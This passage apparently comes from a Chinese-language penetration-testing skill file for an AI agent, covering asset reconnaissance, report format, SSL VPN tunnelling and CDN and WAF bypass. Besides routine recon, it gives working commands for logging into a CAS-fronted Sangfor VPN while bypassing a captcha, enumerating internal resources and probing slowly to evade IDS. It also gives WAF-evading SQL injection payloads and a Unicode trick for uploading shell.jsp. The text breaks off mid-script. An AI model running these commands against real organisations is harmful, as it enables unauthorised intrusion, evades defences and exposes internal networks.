| 域名 | 端口 | 系统名称 | 指纹 (Server) | 存活状态 |
|------|------|----------|---------------|----------|
| xxx.example.com | 443 | 系统标题 | nginx | ✅ 存活 |
```

## 信息收集报告结构（CDID 写作标准）

**CDID = Command → Output → Interpret → Decide。**

当写飞书知识库文档归档打点结果时，用这个结构代替旧版简陋模板：

| 环节 | 要求 | 反例（用了会挨骂） |
|------|------|-------------------|
| **Command** | 完整可执行的命令或原始 HTTP 报文，无占位符 | "用 nmap 扫端口" 不写参数 |
| **Output** | 真实的终端输出 / JSON 响应 / 页面返回，标注关键字段 | "会返回开放端口列表" 不展示实际输出 |
| **Interpret** | 逐项解释输出中每个关键字段的含义（一行一解释） | 贴了 JSON 不解释，读者看不懂 |
| **Decide** | 根据输出结果给出明确的后续动作 | 只展示数据不给结论 |

### 报告结构（必须包含）

1. 基础信息
2. **IP资产分布**（必须，子域名/IP 全量展开，不加"等 N 个"）
3. **资产探活**（必须，含域名/系统名称/指纹/存活状态）
4. Quake 子域名全量列表（每条服务记录单独一行）
5. 技术栈指纹汇总
6. 安全风险分析（分 🔴/🟡/🟢 三级）
7. 攻击面总结（什么能用、什么不能）
8. 扫描信息（时间/工具/版本）

### 关键原则

- 子域名必须完整 FQDN（如 `zsrm.zjenergy.com.cn`，不能只写 `zsrm`）
- 探活状态必须基于实际数据（Quake 记录或直接探测）
- **不用管道符表格**，一律子弹列表 `• **header**: value`
- 每步命令后贴输出示例 → 逐行解释 → 给决策

### 输出规范
- **格式：** Markdown (.md) 文件
- **数据：** 全量输出，不省略、不摘要
- **交付：** 通过消息平台发送文件 + 文字摘要

### 报告结构（必须包含）
1. 目标基本信息
2. IP资产分布
3. **资产探活**（必须有，含域名/系统名称/指纹/存活状态）
4. Quake 子域名全量列表（每条服务记录都要列出）
5. 技术栈指纹汇总
6. 安全风险分析
7. 攻击面总结
8. 扫描信息

### 关键原则
- 子域名数量 = 去重后的独立域名数，服务记录数 = 含端口的完整记录数
- 每个子域名的每个端口都要单独列出，不能合并
- 探活状态必须基于实际数据（Quake 记录或直接探测）

## Quake API 直接调用（重要）

**afrog v3.5.3 不支持 Quake 搜索引擎**（源码中 GetApiKey 仅实现了 ZoomEye），必须通过 curl 直接调用 Quake API。

```bash
# 正确的 Quake API 端点（注意：是 quake.360.net 不是 quake.360.cn）
curl -s -X POST "https://quake.360.net/api/v3/search/quake_service" \
  -H "Content-Type: application/json" \
  -H "X-QuakeToken: <TOKEN>" \
  -d '{"query": "domain: <target>", "start": 0, "size": 100}'
```

### 常见错误
- `quake.360.cn` 会返回 308 重定向到 `quake.360.net`
- 字段名 `service.port` 不可用，直接省略 include 参数即可
- afrog 的 `-cs quake` 参数虽然不报错，但实际返回空（api key is empty 错误是误导性的）

## crt.sh 子域名收集

```bash
curl -s --connect-timeout 15 "https://crt.sh/?q=%25.<domain>&output=json" | python3 -c "
import sys,json
d=json.load(sys.stdin)
names=set()
for e in d:
    for n in e.get('name_value','').split('\\n'):
        names.add(n.strip())
for n in sorted(names):
    if n and '*' not in n: print(n)
"
```

## 域名是否存在判定（多源负验证，NSEC3 否认证明）

用户报一个域名但查不到时，不要只靠单一 DNS 查询就下结论。用六源交叉验证「域名不存在」，避免漏查和误判（2026-08 tsklovexcc.com.cn 实战）：

```bash
# 1. DNS 记录（A/NS/MX/TXT/CNAME 全空）
dig +short $T A; dig +short $T NS; dig +short $T MX; dig +short $T TXT

# 2. 泛解析检测（随机子域，排除"泛解析但无 A 记录"）
dig +short "xyzabc123.$T" A
# 有返回 → 泛解析；无返回 → 排除泛解析

# 3. crt.sh（证书透明度，404 = 从未签发证书）
curl -s -o /dev/null -w "%{http_code}" "https://crt.sh/?q=%25.$T&output=json"
# 404（不是空 JSON）→ 无证书记录

# 4. 权威 whois（.cn 必须用 CNNIC 服务器）
whois $T                    # 通用 whois 常无输出
whois -h whois.cnnic.cn $T  # .cn 域名权威库；"No matching record" = 未注册/已删除

# 5. dig +trace（DNSSEC 否认存在证明 —— 最硬的证据）
dig +trace $T 2>&1 | tail -8
# 出现 NSEC3 + RRSIG 记录 → 权威区以 DNSSEC 签名确认该名称不存在，不是网络故障

# 6. 历史 DNS 数据源（SecurityTrails/HackerTarget/百度收录）
curl -s "https://api.hackertarget.com/hostsearch/?q=$T"
# 全空 + 无收录 → 域名可能从未解析使用过
```

**判定规则：**
- CNNIC `No matching record` + crt.sh 404 + dig +trace NSEC3 → 域名**确定不存在**（未注册或已删除），继续主动扫描无意义
- 主 DNS 空但 crt.sh 有记录 → 域名存在但当前无解析（可能刚注册/换 DNS）
- SecurityTrails 全空是加分证据：曾存在过的域名即使删除通常仍有历史残留，全空说明从未使用

**决策：** 确认不存在后向用户要来源上下文（邮件/日志/聊天记录里的原样域名），不要自己猜变体。可顺手验证常见变体后缀（.com/.cn/去横线）但以用户提供源为准。

### crt.sh 不可用的兜底（常见于中国教育/政府站点）

crt.sh 常因网络环境返回 **502 Bad Gateway**（crt.sh 自身 nginx 网关问题或网络限制），直接和走代理都可能失败。此时使用搜索引擎替代：

```bash
# 方法1: Bing 搜索（推荐，结构清晰）
curl -sL --connect-timeout 10 "https://cn.bing.com/search?q=site:target.edu.cn" | \
  grep -oP 'href="https?://[^"]*\.edu[^"]*"' | cut -d'"' -f2 | sort -u

# 方法2: 直接 DNS 枚举常见前缀（中国高校常用）
for sub in www mail vpn oa portal ehall edu lib jw jwc zs hr job; do
  ip=$(dig +short "${sub}.target.edu.cn" 2>/dev/null)
  [ -n "$ip" ] && echo "${sub}.target.edu.cn → $ip"
done
```

## 域名不存在判定（全源验证链）

当用户给的域名 DNS 全空时，不要直接说"查不到"，按以下链路逐层验证并给出证据链（2026-08 tsklovexcc.com.cn 实战）：

```bash
# 1. DNS 全记录（A/NS/MX/TXT/CNAME 全空是第一个信号）
dig +short $T A; dig +short $T NS; dig +short $T MX; dig +short $T TXT
# 2. 泛解析检测（随机子域，排除"泛解析但无A记录"）
dig +short "xyzabc123.$T" A
# 3. crt.sh 证书透明度（404 = 从未签发过证书）
curl -s -o /dev/null -w "%{http_code}" "https://crt.sh/?q=%25.$T&output=json"   # 404 → 无记录
# 4. CNNIC whois（.cn 域名必须用 whois.cnnic.cn，默认 whois 服务器查不到）
whois -h whois.cnnic.cn $T   # "No matching record" = 权威库无此域名
# 5. 根服务器 dig +trace（DNSSEC 否认存在证明 = 最硬证据）
dig +trace $T   # 出现 NSEC3 + RRSIG 记录 = 该域名在区域中不存在（NSEC3 是 DNSSEC 签名确认）
# 6. 历史 DNS 残留（SecurityTrails / hackertarget）
curl -s "https://api.hackertarget.com/hostsearch/?q=$T"   # "error invalid host" = 无解析
# 7. 搜索引擎收录
curl -s "https://www.baidu.com/s?wd=$T" | grep -oP "$T[^<]{0,50}" | head -5
```

**关键判断点：**
- SecurityTrails/历史数据源全空 = 域名**从未被使用过**（已删除的域名通常还有残留记录）
- NSEC3 否认证明是 DNSSEC 签名的"该域名不存在"响应，比 whois 更硬
- crt.sh 404 只能说明没签发过证书，不能单独证明域名不存在
- .cn 域名必须走 whois.cnnic.cn，通用 whois 输出 "No matching record" 即可确认
- 变体后缀（.com/.cn/连字符变体）一并验证，排除拼写问题

**结论输出格式：** 列出每条证据（谁查的、返回什么、证明什么）→ 判断域名状态（未注册/已删除/从未使用）→ 询问用户来源（邮件/聊天/日志）以便按上下文复查。

**注意：不要想当然猜域名缩写。** 成都艺术职业大学的缩写是 `cdau`（Art+University）而非 `cdart` 或 `cdyszy`。参考案例 `references/cdau-aspnet-mvc-recon.md`。

## CVE 漏洞监控

监控 GitHub 上的高危 CVE 漏洞工具（专注 RCE/提权），自动读取 README 提取利用方式，以卡片形式推送。

**详细工作流：** `references/cve-monitoring-workflow.md`

**快速配置：**
```bash
# 1. 创建监控脚本 (Python)
# 2. 搜索关键词: CVE-2026+RCE+exploit+PoC, CVE-2026+privilege+escalation
# 3. 解读 README 提取利用方式
# 4. 卡片格式输出
# 5. 配置 cron job 每天 09:00 执行
```

**GitHub 批量操作：** `references/github-batch-operations.md`（Fork/Star/创建仓库）

## VPN 隧道内网探测（SSL VPN）

通过 SSL VPN（如深信服 Sangfor）企业隧道访问内网资源时，需要经过 CAS SSO 登录 → 隧道建立 → 慢速探测的完整流程。

### 流程概览

```
CAS 登录（RS 加密） → 获取 CASTGC → 换 Service Ticket (ST-) → CAS Validate → TWFID Cookie → Portal Auth → HTTPS 隧道
```

### 1. CAS 登录（RS 加密版）

深信服 VPN 通常与已有 CAS 集成，需走标准 CAS 登录：

```bash
# 1a. 获取 CAS 登录页，提取 LT 和 JSESSIONID
curl -s -L -c /tmp/cas_cookies.txt "http://cas.target.edu.cn/cas/login" -o /tmp/cas_page.html
LT=$(grep -oP 'name="lt" value="\K[^"]*' /tmp/cas_page.html)
JSID=$(grep -oP 'jsessionid=\K[A-F0-9]+' /tmp/cas_page.html | head -1)

# 1b. 从页面提取 RSA 公钥参数（n, e）
# grep -A5 'new RSAKey' /tmp/cas_page.html
# n = "5598e3b...", e = "10001"

# 1c. 使用浏览器的 JSBN RSA 库加密密码（注意：Python cryptography 库和浏览器 RSA 结果不同，因 PKCS1 填充，两者都可用）
# 下载 CAS 自带的 RSA JS 库（注意 CAS 可能强制重定向 HTTPS→HTTP）
curl -s -L "http://cas.target.edu.cn/cas/js/RSA/rsa.js" -o /tmp/rsa_rsa.js
curl -s -L "http://cas.target.edu.cn/cas/js/RSA/rsa2.js" -o /tmp/rsa_rsa2.js
curl -s -L "http://cas.target.edu.cn/cas/js/RSA/jsbn.js" -o /tmp/rsa_jsbn.js
curl -s -L "http://cas.target.edu.cn/cas/js/RSA/jsbn2.js" -o /tmp/rsa_jsbn2.js
curl -s -L "http://cas.target.edu.cn/cas/js/RSA/prng4.js" -o /tmp/rsa_prng4.js
curl -s -L "http://cas.target.edu.cn/cas/js/RSA/rng.js" -o /tmp/rsa_rng.js

# 1d. Node.js 加密（与浏览器一致）
ENCPWD=$(node -e "
$(cat /tmp/rsa_jsbn.js) $(cat /tmp/rsa_jsbn2.js)
$(cat /tmp/rsa_prng4.js) $(cat /tmp/rsa_rng.js)
$(cat /tmp/rsa_rsa.js) $(cat /tmp/rsa_rsa2.js)
var n='<hex_n>', e='10001';
var rsa=new RSAKey(); rsa.setPublic(n,e);
console.log(rsa.encrypt('<password>'));
")

# 1e. POST 登录（errors=0 可绕过隐藏的验证码）
SERVICE_ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('https://vpn.target.edu.cn/auth/cas_validate?entry_id=1', safe=''))")

curl -s -L -b /tmp/cas_cookies.txt -c /tmp/cas_post_cookies.txt \
  -d "username=<user>" \
  -d "password=${ENCPWD}" \
  -d "lt=${LT}" \
  -d "errors=0" \
  -d "imageCodeName=zwwc" \
  -d "_eventId=submit" \
  -d "rememberMe=true" \
  -d "_rememberMe=on" \
  "http://cas.target.edu.cn/cas/login;jsessionid=${JSID}?service=${SERVICE_ENCODED}"

# 成功 → cookie 中出现 CASTGC
```

### 2. CAS → Service Ticket → TWFID

```bash
# 2a. 用 CASTGC 换 VPN 的 service ticket（ST-）
NEW_TGT="TGT-xxxx-..."
curl -s -o /dev/null -w "%{redirect_url}" -b "CASTGC=${NEW_TGT}" \
  "http://cas.target.edu.cn/cas/login?service=${SERVICE_ENCODED}"
# 返回: https://vpn.target.edu.cn/auth/cas_validate?entry_id=1&ticket=ST-xxxx-cas

# 2b. 访问 validate 端点获取 TWFID Cookie
TICKET_URL="https://vpn.target.edu.cn/auth/cas_validate?entry_id=1&ticket=ST-xxxx-cas"
curl -s -L -c /tmp/vpn_cookies.txt "$TICKET_URL"
# Set-Cookie: TWFID=xxxx
```

### 3. HTTPS 隧道（关键！⚠️ 必须用 HTTPS）

```bash
# ⚠️ HTTP 格式超时，必须用 HTTPS
curl -s --connect-timeout 10 -b "TWFID=xxxx" \
  "https://vpn.target.edu.cn/web/1/http/0/172.17.1.143/"
# ✅ 正确！http://vpn... → ❌ 超时
```

**隧道 URL 格式：**
- `https://vpn.domain.com/web/1/http/0/IP/` — HTTP 服务
- `https://vpn.domain.com/web/1/http/0/IP:PORT/` — 非标端口
- 注意图片资源引用路径：`/web/0/http/2/IP/welcome.png`（http/2 可能是不同代理模式）

### 4. VPN 资源列表枚举

VPN 门户的 `/por/rclist.csp` 会泄露完整的内网资源清单（无需额外鉴权）：

```bash
curl -s -b "TWFID=xxxx" \
  -d "type=web" \
  "https://vpn.target.edu.cn/por/rclist.csp"
```

**资源类型：**
- `type="0"` — WebApp（外部 URL 资源）
- `type="1"` — Web Proxy（可通过隧道代理访问）
- `type="2"` — L3VPN（需要 EasyConnect 客户端，隧道不可达）

**返回内容包含：**
- **DNS 解析表** — 内网域名→IP 映射
- **资源 ID、名称、HTTP 端口、可见性**
- **L3VPN IP 段**（如 `172.16.0.0~172.16.0.255`、`10.254.253.0~10.254.253.255`）
- **SSO 配置**（含加密密码 hash data）

其他有用的 CSP 端点：
```bash
/por/conf.csp            # VPN 配置信息
/por/login_auth.csp      # 认证步骤（StartAuth=1 → 需证书）
/por/login_cert.csp      # 证书认证步骤（可空密码跳过）
/por/randtick.csp        # 随机数
/por/timequery.csp       # 时间查询
```

### 5. 慢速内网探测（‼️ 通过 VPN 隧道时）

**关键约束：** VPN 隧道环境脆弱，必须严格控制探测频率，避免触发 WAF/IDS 封禁或 VPN 会话断开。

```bash
# ⚠️ 极慢探测：每次请求间隔至少 20-25 秒
# 不要并发，不要多线程

TWFID="xxxx"

# 探活格式
curl -s -o /dev/null -w "%{http_code} %{time_total}s" \
  --connect-timeout 8 --max-time 15 \
  -b "TWFID=${TWFID}" \
  "https://vpn.domain.com/web/1/http/0/TARGET_IP/"

# 每个请求之间 sleep
sleep 25
# …下一个请求
```

**HTTP 状态码解读（通过隧道）：**
| 状态码 | 含义 |
|--------|------|
| 200 | 服务存活 |
| 302/301 | 服务存活（需跟随重定向）|
| 404 | Web 服务存在但路径不存在 |
| 503 | 目标 IP 无 HTTP 服务/网关拒绝 |
| 000/超时 | 目标不可达/防火墙拦截 |
| 502 | VPN 代理错误 |

### 6. VPN 会话维护

**SSL VPN 会话通常 4-8 小时过期**，过期后需要重新走完整的 CAS 登录流程。发现所有隧道 URL 返回超时（000）时，按顺序检查：

```bash
# 1. 检查 VPN 门户是否可达
curl -s -o /dev/null -w "%{http_code}" "https://vpn.domain.com/"

# 2. 检查旧 TWFID 是否有效
curl -s -b "TWFID=old_value" "https://vpn.domain.com/por/login_auth.csp"
# 返回 "user had logged in" → 有效
# 重定向到 CAS 登录页 → 过期

# 3. 重新 CAS 登录（流程从头开始）
```

### Pitfalls（VPN 隧道专用）

1. **隧道 URL 必须用 HTTPS** — `http://vpn.../web/1/http/0/...` 会超时，`https://vpn...` 正常
2. **频率越低越好** — 用户明确要求"不需要快"，间隔 20-25s 是安全线
3. **L3VPN 资源不可达** — type=2 资源（如 `10.x.x.x`、部分 `172.16.x.x`）需要 EasyConnect 客户端，web proxy 隧道过不去
4. **CAS 强制 HTTPS→HTTP** — 某些 CAS 会将所有 HTTPS 请求 302 到 HTTP，登录和 JS 下载必须走 HTTP
5. **CAS 验证码隐藏** — `errors=0&imageCodeName=zwwc` 可在前 N 次尝试绕过验证码
6. **RSA 加密每次结果不同** — PKCS1 随机填充导致，这是正常的；每次 POST 前重新加密即可
7. **资源列表缓存** — rclist.csp 结果可能被 VPN 缓存，需要时重新请求
8. **同一 TWFID 跨多请求** — 隧道请求共享同一 TWFID cookie，不要每请求重新获取

## CDN Bypass & Origin Server Discovery

发现目标被 Cloudflare/Damddos/任意 CDN 防护时，需要绕过 CDN 找到真实源站 IP。这是 Web 渗透中绕不过的关键一步——所有有价值的目标迟早会撞上 CDN。

**新手陷阱：** 看到 Cloudflare Turnstile 验证页面就放弃。实际上 CDN 后面才是真正的攻击面——绕过 CDN 才能看到真实的端口、版本、漏洞。

### 1. CDN 识别

```bash
# DNS 查询判断是否走 CDN
dig www.target.com A +short
# → 如果返回 CNAME 指向 cloudflare.net/damddos.com/akamai.net 等 → 有 CDN

# Cloudflare 特征
curl -sk "https://www.target.com/" | grep -E "Turnstile|正在验证您是否是真人|请稍候|cf-turnstile|cf-challenge"
# 响应头: cf-ray, server: cloudflare

# Damddos 特征
dig www.target.com CNAME +short | grep -i damddos

# 常见 CDN CNAME 指纹
# Cloudflare → *.cloudflare.net
# Damddos → *.iname.damddos.com
# Akamai → *.akamai.net
# Fastly → *.fastly.net
# CloudFront → *.cloudfront.net
# ChinaCache → *.ccgslb.com
# Alibaba Cloud CDN → *.alicdn.com
```

### 2. 多层 CDN 路径分析

现代站点可能同时使用多层 CDN。通过跟踪 CNAME 链发现完整路径：

```bash
# 跟踪 CNAME 链（逐层展开）
dig www.target.com CNAME +short | while read cname; do
  echo "→ $cname"
  dig $cname A +short
done
```

**两层 CDN 的判断：** 直接访问触发 Turnstile（Cloudflare），DNS 解析到 Damddos IP（非 Cloudflare 的 104.x/172.67.x）。说明 Cloudflare 在前端做验证，Damddos 在后端做 DDoS 防护，两者串联。

### 3. 绕过方法

#### 3a. 子域名绕过（最高效、最稳定）

寻找没有经过 CDN 的子域名——这是绕过 CDN 的**最佳路径**：

```bash
# 方法1: 枚举所有子域名后逐一对 CDN IP 和非 CDN IP
curl -s "https://crt.sh/?q=%25.target.com&output=json" | python3 -c "
import sys,json;d=json.load(sys.stdin)
for n in sorted({e for i in d for e in i['name_value'].split('\\n') if '*' not in e and e.strip()}):
    print(n)
" > all_subs.txt

for sub in $(cat all_subs.txt); do
  ip=$(dig +short "$sub" 2>/dev/null | head -1)
  if [ -n "$ip" ]; then
    cdn=false
    echo "$ip" | grep -qE '^(104\.|172\.67\.|103\.21\.|103\.22\.|103\.31\.)' && cdn=true
    [ "$cdn" = false ] && echo "⚠️  ${sub} → ${ip} ← 非 Cloudflare 段，可能裸奔！"
  fi
done

# 方法2: DNS 对比法 — 常见未保护子域名前缀
for prefix in cook dev test api admin mail static cdn blog www2 m app backup stage; do
  ip=$(dig +short "${prefix}.target.com" 2>/dev/null)
  [ -n "$ip" ] && echo "${prefix}.target.com → $ip"
done
```

**关键原理：** 管理员只给 `www` 或主域名配置了 CDN。开发环境（`dev`、`cook`、`test`）、内部工具（`admin`、`api`）、静态资源（`static`）经常被忘记加入 CDN，直接解析到源站 IP。

#### 3b. `--resolve` 验证源站

```bash
curl -sk --resolve www.target.com:443:1.2.3.4 https://www.target.com/
# 成功标志：返回正常页面（而非 CDN 验证/挑战页）
```

#### 3c. Host 头绕过

```bash
curl -sk -H "Host: www.target.com" https://1.2.3.4/
```

### 4. 源站一致性验证（⚠️ 必须做）

```bash
# 验证1: 页面内容 Hash 对比
HASH1=$(curl -sk "https://www.target.com/" | sha256sum)
HASH2=$(curl -sk --resolve www.target.com:443:1.2.3.4 https://www.target.com/ | sha256sum)
[ "$HASH1" = "$HASH2" ] && echo "✅ 内容一致，确认源站" || echo "❌ 内容不一致"

# 验证2: 响应头指纹一致
curl -skI "https://www.target.com/" | grep -E "^Server:|^X-Powered-By:"
curl -skI --resolve www.target.com:443:1.2.3.4 https://www.target.com/ | grep -E "^Server:|^X-Powered-By:"

# 验证3: SSL 证书主题
echo | openssl s_client -connect 1.2.3.4:443 -servername www.target.com 2>/dev/null | \
  openssl x509 -noout -subject 2>/dev/null
# → 应包含 CN=target.com
```

### 5. 源站深度探测（绕过后立即执行）

```bash
# 全端口扫描
nmap -p- --min-rate=5000 -T4 1.2.3.4

# 服务版本
nmap -sV -p 22,80,443,8080,8443 1.2.3.4

# Web 指纹（绕过 CDN 后暴露真实指纹）
curl -skI --resolve www.target.com:443:1.2.3.4 https://www.target.com/

# SSL 完整分析
echo | openssl s_client -connect 1.2.3.4:443 -servername www.target.com 2>/dev/null | \
  openssl x509 -noout -text 2>/dev/null | grep -E "Subject:|Issuer:|Not Before:|Not After:|Subject Alternative Name"

# 敏感路径探测（绕过 CDN 后可能暴露额外端点）
for path in \
  /admin/login.php /admin/ /install.php /config.inc.php /.env /.git/HEAD \
  /robots.txt /LICENSE.txt /usr/uploads/ \
  /api/ /swagger-ui.html /actuator/health /graphql \
  /xmlrpc.php /index.php/action/xmlrpc; do
  code=$(curl -sk --resolve www.target.com:443:1.2.3.4 -o /dev/null -w "%{http_code}" "https://www.target.com${path}")
  echo "${code} ${path}"
done
```

### 6. 源站风险评估速查表

| 风险项 | 检查方法 | 严重度 |
|--------|---------|--------|
| **SSL 证书即将/已过期** | `openssl x509 -noout -enddate` | 🔴 高 |
| **未受保护子域名暴露源站 IP** | DNS 对比所有子域名 | 🔴 高 |
| **CMS 版本过旧** | `<meta name="generator">`, `X-Powered-By` | 🔴 高 |
| **源站开放端口过多** | 全端口扫描 | 🟡 中 |
| **XML-RPC 完全暴露** | `system.listMethods` 调用 | 🟡 中 |
| **管理员入口未锁定** | 连续错误登录测试 | 🟡 中 |
| **软件版本 EOL** | PHP < 8.0, nginx < 1.24 等 | 🟡 中 |
| **目录列表/配置泄露** | 目录尾加 `/`, `config.php.bak` | 🟢 低 |

### 7. 常见 CDN 绕过后漏洞路径

```bash
# PHP 7.3 EOL → 已知 CVE 列表
# CVE-2023-0567 (phar 反序列化)
# CVE-2023-0662 (phar 反序列化)

# Typecho 1.2.0 已知漏洞
# CVE-2022-29321 — install.php 反序列化 RCE
# CVE-2022-33197 — 后台 SQL 注入

# XML-RPC 漏洞面
# pingback.ping → SSRF
# wp.uploadFile → 文件上传（需凭证）
# 无认证 wp.getComment → 信息泄露
```

### 8. 防御建议（写给甲方）

1. **所有子域名走 CDN** — 定期 DNS 审计，确保无解析到源站 IP 的子域名
2. **源站 ACL** — 仅允许 CDN 回源 IP 段访问 80/443
3. **nginx Host 头校验** — 拒绝非预期 Host 头的请求
4. **SSL 证书覆盖所有子域名** — 或使用 `*.target.com` 泛域名
5. **证书到期监控** — 设置到期前 30 天自动告警
6. **最小化开放端口** — 源站只开 80/443，SSH 仅限管理 IP

### Reference

- `references/cdn-bypass-case-study.md` — 完整实战案例（jadejunius.cn 双层 CDN 绕过 + 源站 Typecho 深度探测）
- `references/chinese-persona-osint.md` — 中文人名公网暴露面搜索方法论：GitHub 深度分析、ICP 备案查询、搜索引擎/安全社区/泄露数据库搜索全流程

## WAF 遭遇处理流程（信息收集阶段）

信息收集过程中遇到 WAF 阻挡时，按以下流程处理。该流程引用知识库 `1.5-思路整理` 中的详细 WAF 绕过技术文档。

### Step 1 — WAF 识别

```bash
# 1. 用 WAFW00F 识别类型
wafw00f https://target.com -a

# 2. 响应头指纹判断
curl -skI "https://target.com" | grep -iE "server:|cf-ray|x-safedog|x-powered-by|x-aspnet-version"
# Cloudflare → cf-ray header, server: cloudflare
# 安全狗 → X-SafeDog header
# 阿里云 WAF → X-Powered-By: Alibaba Cloud WAF
# 腾讯云 WAF → server: tencent-waf

# 3. Body 特征判断
curl -sk "https://target.com/?id=1'" | grep -iE "waf|安全狗|拦截|blocked|turnstile|challenge"
# Cloudflare → cf-turnstile / Turnstile / 验证真人
# ModSecurity → 406 Not Acceptable / ModSecurity
# 长亭 SafeLine → SafeLine WAF 拦截页面

# 4. 主动探测（发送明显恶意 payload 看返回）
curl -sk -o /dev/null -w "%{http_code}" "https://target.com/?id=1%27%20OR%201=1--"
# 406/403 → WAF 拦截
# 200 → 无 WAF 或规则未命中
```

### Step 2 — 决策分支

```
遇到 WAF
├─ 云 WAF（Cloudflare/阿里云/腾讯云/AWS WAF）
│  ├─ 走 CDN 绕过 → 找到源站 IP → 绕过后继续
│  └─ 走协议层绕过（chunked/Content-Type 变形/HTTP 走私）
├─ 主机型 WAF（安全狗/云锁/D盾）
│  └─ 走协议层绕过 + 编码混淆
├─ 软 WAF（ModSecurity/OpenResty）
│  └─ 走请求变形（编码/大小写/注释混淆）
├─ 应用层 WAF（长亭 SafeLine/Imperva）
│  └─ 走内容层绕过（Padding/HPP/Ghost Bits）
└─ 未知 WAF
   ├─ 尝试 CDN 绕过 → 协议层 → 编码混淆 → 性能绕过
   └─ 若通通失败 → 切换被动收集模式
```

### Step 3 — 各分支具体手法

**云 WAF → CDN 绕过（最高优先级）：**

```bash
# 1. 找未走 CDN 的子域名
for sub in dev test api admin mail static cdn blog www2; do
  ip=$(dig +short "${sub}.target.com" 2>/dev/null)
  [ -n "$ip" ] && echo "${sub}.target.com → ${ip}"
done

# 2. 历史 DNS 记录查源站
# SecurityTrails / Censys / crt.sh

# 3. 直连源站验证
curl -sk --resolve www.target.com:443:1.2.3.4 "https://www.target.com/"
curl -sk -H "Host: www.target.com" "https://1.2.3.4/"
```

详细 CDN 绕过方法论见本 skill「CDN Bypass & Origin Server Discovery」章节。

**协议层绕过（云 WAF 和主机型 WAF 通用）：**

```bash
# 1. Chunked Transfer Encoding
curl -sk -X POST "https://target.com/vuln.php" \
  -H "Transfer-Encoding: chunked" \
  -d $'3\nid=\n4\n1 UN\n3\nION\n7\n SELECT\n1\n \n9\n@@version\n1\n-\n2\n-\n0\n\n'

# 2. Content-Type 变换（JSON 绕过）
curl -sk -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"id": "1 UNION SELECT 1,2,3--"}'

# 3. HTTP 参数污染（HPP）
curl -sk "https://target.com/search?q=SEL&q=ECT&q=+1,2,3"

# 4. 超长请求体填充（Padding—最实用）
curl -sk -X POST "https://target.com/api" \
  -d "padding=$(python3 -c "print('A'*8192)")&id=1 UNION SELECT 1,2,3--"
```

**编码/内容层绕过（软 WAF 和未知 WAF）：**

```bash
# 1. URL 双重编码
curl -sk "https://target.com/?id=%2527%2520UNION%2520SELECT%25201,2,3--"

# 2. Ghost Bits（Java 后端专杀）
# 用 Unicode 字符的高位截断绕过 Java WAF
curl -sk "https://target.com/upload" \
  -F "file=@shell.jsp;filename*=UTF-8''1.陪sp"
# 陪(U+966A) → 低 8 位 = 0x6A = 'j'
# WAF 看到 1.陪sp，Tomcat 落盘为 1.jsp

# 3. 注释混淆
curl -sk "https://target.com/?id=1/*!UNION*//*!SELECT*/1,2,3--"

# 4. 大小写 + 内联注释混合
curl -sk "https://target.com/?id=1+UnIoN+SeLeCt+1,2,3--"
```

### Step 4 — 绕过验证

```bash
# 确认已绕过 WAF
# 1. 对比响应状态码（拦截时 403/406 vs 绕过后 200）
code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com/?id=1%27UNION%20SELECT%201,2,3--")
[ "$code" = "200" ] && echo "✅ 绕过成功" || echo "❌ 仍被拦截"

# 2. 对比响应体大小（拦截页 vs 正常页）
normal_size=$(curl -sk -o /dev/null -w "%{size_download}" "https://target.com/")
attack_size=$(curl -sk -o /dev/null -w "%{size_download}" "https://target.com/?id=1%27UNION%20SELECT%201,2,3--")
echo "正常: ${normal_size} / 攻击: ${attack_size}"

# 3. 无 challenge/验证页
curl -sk "https://target.com/?id=1'" | grep -c "turnstile\|challenge\|验证真人\|waf"
```

### Step 5 — 绕不过的兜底

```bash
# 1. 切换纯被动收集（不走 WAF）
# Quake 历史数据
python3 ~/.hermes/tools/quake_query.py --domain target.com

# crt.sh 子域名
curl -s "https://crt.sh/?q=%25.target.com&output=json"

# JS 源码分析（静态不触发 WAF）
curl -sk "https://target.com/static/js/app.xxx.js" | grep -oP 'https?://[^"'"'"' )]+' | sort -u

# 2. 转向其他入口
# 找 dev/api/mail 子域名（可能不在 WAF 保护下）
# 找 ICP 关联域名（Quake 搜 ICP 备案号）
python3 ~/.hermes/tools/quake_query.py --icp "京ICP备XXXXXX号"

# 3. 若所有入口都被 WAF 保护
# 记录 WAF 类型和版本 → 存档到 1.5-思路整理
# 等待新的绕过技术出现后重试
```

### 引用知识库

WAF 分类绕过、Ghost Bits 映射表、各 WAF 弱点地图等完整内容参见知识库：

`1.5-思路整理 > A — WAF 绕过技术演进`

## Automated Recon Workflow

```bash
#!/bin/bash
# recon.sh - Automated reconnaissance script using dddd & afrog
TARGET=$1
OUTPUT_DIR="recon_${TARGET}_$(date +%Y%m%d)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting reconnaissance on $TARGET"

# WHOIS
echo "[+] WHOIS lookup..."
whois "$TARGET" > "$OUTPUT_DIR/whois.txt" 2>&1

# DNS
echo "[+] DNS enumeration..."
dig "$TARGET" ANY +noall +answer > "$OUTPUT_DIR/dns.txt"
dig "$TARGET" MX +short >> "$OUTPUT_DIR/dns.txt"
dig "$TARGET" NS +short >> "$OUTPUT_DIR/dns.txt"
dig "$TARGET" TXT +short >> "$OUTPUT_DIR/dns.txt"

# Subdomains
echo "[+] Subdomain discovery..."
subfinder -d "$TARGET" -o "$OUTPUT_DIR/subdomains.txt" 2>/dev/null

# Port scan with dddd
echo "[+] Port scanning with dddd..."
/home/c1ay/.local/bin/dddd -t "$TARGET" -o "$OUTPUT_DIR/dddd_results.txt"

# Vulnerability scan with afrog
echo "[+] Vulnerability scanning with afrog..."
/home/c1ay/.local/bin/afrog -t "https://$TARGET" -o "$OUTPUT_DIR/afrog_report.html"

echo "[*] Reconnaissance complete. Results in $OUTPUT_DIR/"
```

## Enterprise Recon Workflow（实战验证）

对企业目标的标准信息收集流程，经过多次实战验证：

```bash
#!/bin/bash
# enterprise-recon.sh - 企业资产信息收集
TARGET=$1
QUAKE_KEY=$2

echo "[1/5] 基础信息"
# crt.sh 子域名（证书透明度）
curl -s "https://crt.sh/?q=%25.${TARGET}&output=json" | \
  python3 -c "import sys,json;d=json.load(sys.stdin);[print(n) for n in sorted({e for i in d for e in i['name_value'].split('\n') if '*' not in e and e.strip()})]" 2>/dev/null

echo "[2/5] Quake 子域名收集"
curl -s -X POST "https://quake.360.net/api/v3/search/quake_service" \
  -H "Content-Type: application/json" \
  -H "X-QuakeToken: ${QUAKE_KEY}" \
